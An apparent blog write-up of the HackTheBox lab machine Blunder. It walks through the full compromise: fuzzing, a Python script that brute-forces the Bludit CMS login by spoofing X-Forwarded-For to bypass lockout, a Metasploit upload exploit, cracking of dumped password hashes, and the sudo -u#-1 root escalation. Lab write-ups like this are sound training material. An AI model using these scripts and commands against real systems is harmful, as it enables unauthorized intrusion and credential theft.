
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark)"
    href="../../theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark)"
          href="../../theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
          href="../../theme/pygments/sas.min.css">


  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">


    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">



  


 

<meta name="author" content="maggick" />
<meta name="description" content="This is a writeup about a retired HacktheBox machine: Blunder. This box was created by egotisticalSW and publish on May 30, 2020. The box is rated as an easy box. It implies enumeration, generating a custom wordlist with cewl, using metasploit, cracking a password and a sudo vulnerability." />
<meta name="keywords" content="security, boot2root, HTB, linux, cewl, bludit, sudo">


  <meta property="og:site_name" content="maggick's logs"/>
  <meta property="og:title" content="HTB: Blunder"/>
  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Blunder. This box was created by egotisticalSW and publish on May 30, 2020. The box is rated as an easy box. It implies enumeration, generating a custom wordlist with cewl, using metasploit, cracking a password and a sudo vulnerability."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="../../2020/10/htb-blunder.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2020-10-19 08:45:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="../../author/maggick.html">
  <meta property="article:section" content="security"/>
  <meta property="article:tag" content="security"/>
  <meta property="article:tag" content="boot2root"/>
  <meta property="article:tag" content="HTB"/>
  <meta property="article:tag" content="linux"/>
  <meta property="article:tag" content="cewl"/>
  <meta property="article:tag" content="bludit"/>
  <meta property="article:tag" content="sudo"/>
  <meta property="og:image" content="https://maggick.fr/media/image.png">

  <title>maggick's logs &ndash; HTB: Blunder</title>

</head>
<body >
  <aside>
    <div>
      <a href="../../">
        <img src="https://maggick.fr/media/image.png" alt="" title="">
      </a>

      <h1>
        <a href="../../"></a>
      </h1>



      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="../../pages/about.html">
                  About
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/notes.html">
                  Notes
                </a>
              </li>
              <li>
                <a target="_self"
                   href="../../pages/tools.html">
                  Tools
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
              <i class="fab fa-github"></i>
            </a>
          </li>
          <li>
            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
          <li>
            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
              <i class="fab fa-stack-overflow"></i>
            </a>
          </li>
          <li>
            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
              <i class="fas fa-rss"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="../../">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-blunder">HTB: Blunder</h1>
    <p>
      Posted on 19 Oct 2020 in <a href="../../category/security.html">security</a>

        &#8226; 6 min read
    </p>
  </header>


  <div>
    <p><img class="align-left" src="/media/2020.10/blunder_card.png" alt="Blunder Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/254">Blunder</a>.
This box was created by
<a href="https://www.hackthebox.com/home/users/profile/94858">egotisticalSW</a> and publish on
May 30, 2020. The box is rated as an easy box. It implies enumeration,
generating a custom wordlist with <code>cewl</code>, using metasploit, cracking a password
and a <code>sudo</code> vulnerability.</p>


<h1>User</h1>
<h2>Recon</h2>
<p>Let us start as always by a <code>nmap</code> scan. Only port 80 is open.</p>
<div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Mon Jun  1 05:39:09 2020 as: nmap -oN nmap -sSV -p- 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.60s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 06:01:11 2020 -- 1 IP address (1 host up) scanned in 1322.38 seconds
</code></pre></div>

<h2>Web</h2>
<p>The website present three "interesting" facts.</p>
<p><img alt="home page" src="/media/2020.10/blunder_01.png"></p>
<p>There is nothing really interesting on the site.
We notice two external links, one to <a href="https://www.twitter.com/WhortonMr">the box creator twitter
account</a> the other one to <a href="https://www.computerhope.com/history/1996.htm">computer hope page
for 1996</a>.</p>
<p>The <code>robots.txt</code> file is a basic one.
We launch a <a href="https://github.com/ffuf/ffuf">fuff</a> scan with a few extensions. And
discover an interesting file: <code>todo.txt</code>.</p>
<div class="highlight"><pre><span></span><code>$ ./ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.10.10.191/FUZZ  -mc 200 -e .txt,.php,.php.bak,.pdf

        /&#39;___\  /&#39;___\           /&#39;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.191/FUZZ
 :: Extensions       : .txt .php .php.bak .pdf
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

                        [Status: 200, Size: 8162, Words: 841, Lines: 197]
0                       [Status: 200, Size: 8162, Words: 841, Lines: 197]
about                   [Status: 200, Size: 3280, Words: 225, Lines: 106]
install.php             [Status: 200, Size: 30, Words: 5, Lines: 1]
LICENSE                 [Status: 200, Size: 1083, Words: 155, Lines: 22]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
robots.txt              [Status: 200, Size: 22, Words: 3, Lines: 2]
todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
:: Progress: [23070/23070]Â :: Job [1/1] :: 34 req/sec :: Duration: [0:11:15] :: Errors: 0 ::
</code></pre></div>

<p>The content of the <code>todo.txt</code> file is the following:</p>
<blockquote>
<p>-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING</p>
</blockquote>
<p>We deduce that the website use a CMS and that the user might be <code>fergus</code>.</p>
<p>We quickly discover the <code>/admin</code> page which is the login page for the CMS:
<a href="https://www.bludit.com/">bludit</a>.</p>
<p><code>Searchspoilt</code> provide two authenticated exploit for <code>bludit</code>. A Google search
"bludit authentication bypass" direct us to <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">an article about bypass the bludit
brute force mitigation mechanism</a>
which contain a POC in Python.</p>
<p>We got an user (<code>fergus</code>) but no password.
We use <a href="https://github.com/digininja/CeWL">cewl</a> to generate a list of word from
the website. As mentioned earlier there is two offsite links so we configure
<code>cewl</code> to just parse our page with <code>-d 1</code>. Also we want to save the password in
a file <code>pass</code> with the <code>-w</code> option.</p>
<div class="highlight"><pre><span></span><code>cewl -d 1 http://10.10.10.191 -w pass
</code></pre></div>

<p>We quickly rewrite the POC in order to load the passwords from our <code>pass</code> file.</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.10.191&#39;</span>
<span class="n">login_url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="s1">&#39;/admin/login&#39;</span>
<span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;fergus&#39;</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;pass&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">login_page</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">login_url</span><span class="p">)</span>
    <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#39;</span><span class="p">,</span> <span class="n">login_page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] Trying: </span><span class="si">{p}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>

    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;X-Forwarded-For&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">login_url</span>
    <span class="p">}</span>

    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;tokenCSRF&#39;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
        <span class="s1">&#39;save&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span>
    <span class="p">}</span>

    <span class="n">login_result</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">login_url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>

    <span class="k">if</span> <span class="s1">&#39;location&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
        <span class="k">if</span> <span class="s1">&#39;/admin/dashboard&#39;</span> <span class="ow">in</span> <span class="n">login_result</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;location&#39;</span><span class="p">]:</span>
            <span class="nb">print</span><span class="p">()</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;SUCCESS: Password found!&#39;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Use </span><span class="si">{u}</span><span class="s1">:</span><span class="si">{p}</span><span class="s1"> to login.&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">p</span> <span class="o">=</span> <span class="n">password</span><span class="p">))</span>
            <span class="nb">print</span><span class="p">()</span>
            <span class="k">break</span>
</code></pre></div>

<p>We run the script and found the password <code>RolandDeschain</code>.</p>
<div class="highlight"><pre><span></span><code>$python3 bludit_auth_bypass.py
[*] Trying: Load
[*] Trying: Plugins
[*] Trying: and
&lt;SNIP&gt;
[*] Trying: best
[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
</code></pre></div>

<h2>metasploit</h2>
<p>One of the two authenticated exploit shown by searchsploit is a metasploit
module. So we fire up <code>msf</code> and search for <code>bludit</code>. Only one module pop up. We
directly use this module and set the different options. Once run we get a
<code>meterpreter</code> on the box as <code>www-data</code>.</p>
<div class="highlight"><pre><span></span><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhost 10.10.10.191
rhost =&gt; 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITPASS RolandDeschain
BLUDITPASS =&gt; RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set BLUDITUSER fergus
BLUDITUSER =&gt; fergus
msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run
</code></pre></div>

<p>As <code>bludit</code> is a "flat files" CMS every information is stored in PHP file. We
quickly found a <code>users.php</code> file containing the user information including
password hashes.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; cat ../databases/users.php
&lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&gt;
{
    &quot;admin&quot;: {
        &quot;nickname&quot;: &quot;Admin&quot;,
        &quot;firstName&quot;: &quot;Administrator&quot;,
        &quot;lastName&quot;: &quot;&quot;,
        &quot;role&quot;: &quot;admin&quot;,
        &quot;password&quot;: &quot;bfcc887f62e36ea019e3295aafb8a3885966e265&quot;,
        &quot;salt&quot;: &quot;5dde2887e7aca&quot;,
        &quot;email&quot;: &quot;&quot;,
        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
        &quot;tokenRemember&quot;: &quot;&quot;,
        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
        &quot;twitter&quot;: &quot;&quot;,
        &quot;facebook&quot;: &quot;&quot;,
        &quot;instagram&quot;: &quot;&quot;,
        &quot;codepen&quot;: &quot;&quot;,
        &quot;linkedin&quot;: &quot;&quot;,
        &quot;github&quot;: &quot;&quot;,
        &quot;gitlab&quot;: &quot;&quot;
    },
    &quot;fergus&quot;: {
        &quot;firstName&quot;: &quot;&quot;,
        &quot;lastName&quot;: &quot;&quot;,
        &quot;nickname&quot;: &quot;&quot;,
        &quot;description&quot;: &quot;&quot;,
        &quot;role&quot;: &quot;author&quot;,
        &quot;password&quot;: &quot;be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7&quot;,
        &quot;salt&quot;: &quot;jqxpjfnv&quot;,
        &quot;email&quot;: &quot;&quot;,
        &quot;registered&quot;: &quot;2019-11-27 13:26:44&quot;,
        &quot;tokenRemember&quot;: &quot;&quot;,
        &quot;tokenAuth&quot;: &quot;0e8011811356c0c5bd2211cba8c50471&quot;,
        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
        &quot;twitter&quot;: &quot;&quot;,
        &quot;facebook&quot;: &quot;&quot;,
        &quot;codepen&quot;: &quot;&quot;,
        &quot;instagram&quot;: &quot;&quot;,
        &quot;github&quot;: &quot;&quot;,
        &quot;gitlab&quot;: &quot;&quot;,
        &quot;linkedin&quot;: &quot;&quot;,
        &quot;mastodon&quot;: &quot;&quot;
    }
</code></pre></div>

<p>Looking at <a href="https://github.com/bludit/bludit/blob/master/bl-kernel/users.class.php#L155">the code</a>
we quickly found that the hash algorithm is SHA1 with salt.</p>
<p>Looking more at the code we found another bludit folder with a newer version.
This time the <code>users.php</code> file contain a password without salt for the <code>hugo</code>
user.</p>
<div class="highlight"><pre><span></span><code>meterpreter &gt; getwd
/var/www/bludit-3.9.2/bl-content
meterpreter &gt; cd ../../
meterpreter &gt; ls
Listing: /var/www
=================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-05-19 10:13:22 -0400  bludit-3.10.0a
40775/rwxrwxr-x  4096  dir   2020-04-28 07:18:03 -0400  bludit-3.9.2
40755/rwxr-xr-x  4096  dir   2019-11-28 04:34:02 -0500  html

meterpreter &gt; cd bludit-3.10.0a
meterpreter &gt; ls
Listing: /var/www/bludit-3.10.0a
================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  .github
100644/rw-r--r--  582    fil   2019-10-19 04:10:46 -0400  .gitignore
100644/rw-r--r--  395    fil   2019-10-19 04:10:46 -0400  .htaccess
100644/rw-r--r--  1083   fil   2019-10-19 04:10:46 -0400  LICENSE
100644/rw-r--r--  2893   fil   2019-10-19 04:10:46 -0400  README.md
40755/rwxr-xr-x   4096   dir   2020-05-19 05:03:34 -0400  bl-content
40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-kernel
40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-languages
40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-plugins
40755/rwxr-xr-x   4096   dir   2019-10-19 04:10:46 -0400  bl-themes
100644/rw-r--r--  900    fil   2020-05-19 06:27:40 -0400  index.php
100644/rw-r--r--  20306  fil   2019-10-19 04:10:46 -0400  install.php

meterpreter &gt; cd bl-content
meterpreter &gt; ls
Listing: /var/www/bludit-3.10.0a/bl-content
===========================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-05-19 05:10:14 -0400  databases
40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  pages
40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  tmp
40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  uploads
40755/rwxr-xr-x  4096  dir   2020-05-19 05:03:34 -0400  workspaces

meterpreter &gt; cat databases/users.php
&lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&gt;
{
    &quot;admin&quot;: {
        &quot;nickname&quot;: &quot;Hugo&quot;,
        &quot;firstName&quot;: &quot;Hugo&quot;,
        &quot;lastName&quot;: &quot;&quot;,
        &quot;role&quot;: &quot;User&quot;,
        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
        &quot;email&quot;: &quot;&quot;,
        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
        &quot;tokenRemember&quot;: &quot;&quot;,
        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
        &quot;twitter&quot;: &quot;&quot;,
        &quot;facebook&quot;: &quot;&quot;,
        &quot;instagram&quot;: &quot;&quot;,
        &quot;codepen&quot;: &quot;&quot;,
        &quot;linkedin&quot;: &quot;&quot;,
        &quot;github&quot;: &quot;&quot;,
        &quot;gitlab&quot;: &quot;&quot;}
}
</code></pre></div>

<p>We put the hash in a local file and run john the ripper on it with the <code>rockyou</code>
dictionary. The come up empty. So we had the <code>--rules</code> option to add a few rules
to our dictionary. The password <code>Password120</code> is quickly found.</p>
<div class="highlight"><pre><span></span><code>$john haash -w=tools/password_lists/rockyou.txt --rules
Warning: detected hash type &quot;Raw-SHA1&quot;, but the string is also recognized as &quot;Raw-SHA1-AxCrypt&quot;
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=8
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Password120      (hugo)
</code></pre></div>

<p>We can now us <code>su</code> to switch user to <code>hugo</code> and get the user flag but first of all we need an
interactive shell.</p>
<div class="highlight"><pre><span></span><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;
$ su hugo
su hugo
Password: Password120

id
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd
cd
hugo@blunder:~$ cat user.txt
cat user.txt
2fc521288709e7da0e7119128831b13c
</code></pre></div>

<h1>Root</h1>
<p>We list our <code>sudo</code> privileges and found that we can run <code>/bin/bash</code> as every
user except <code>root</code>. This a <a href="https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287">"recent" sudo vulnerability</a>
and we just need to use the <code>-u#-1</code> parameter to get a <code>root</code> shell and get the flag.</p>
<div class="highlight"><pre><span></span><code>hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/# cd /root/
cd /root/
root@blunder:/root# cat root.txt
cat root.txt
01efa72b77e36192eda3c5a08a9ba4a8
</code></pre></div>

<h1>Wrapping up</h1>
<p>For an easy box this was easy. I was wondering when the <code>sudo</code> vulnerability
will appear on HTB.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/linux.html">linux</a>
      <a href="../../tag/cewl.html">cewl</a>
      <a href="../../tag/bludit.html">bludit</a>
      <a href="../../tag/sudo.html">sudo</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2020/10/htb-cache.html" title="HTB: Cache">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/11/htb-remote.html" title="HTB: Remote">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>